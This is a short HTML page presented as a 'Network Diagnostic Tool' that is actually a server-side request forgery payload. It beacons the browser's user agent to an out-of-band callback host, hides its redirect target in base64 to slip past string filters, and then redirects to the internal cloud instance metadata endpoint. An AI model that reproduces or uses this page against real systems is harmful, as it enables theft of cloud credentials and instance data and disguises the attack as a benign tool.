<!DOCTYPE html>
<html>
<head>
    <title>Network Diagnostic Tool</title>
</head>
<body>
    <h1>Diagnostic Phase: <span id="mode">Initializing...</span></h1>
    <script>
        const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
        
        // Immediate beacon to see if JS is alive
        new Image().src = `https://${collab}/js_alive?ua=${btoa(navigator.userAgent)}`;

        // We use a base64 encoded redirect to hide the target from simple string filters
        const target = atob("aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9tZXRhZGF0YS9pbnN0YW5jZT9hcGktdmVyc2lvbj0yMDIxLTAyLTAx");

        setTimeout(() => {
            document.getElementById('mode').innerText = "Redirecting to Internal Node...";
            window.location.href = target;
        }, 3000);
    </script>
</body>
</html>
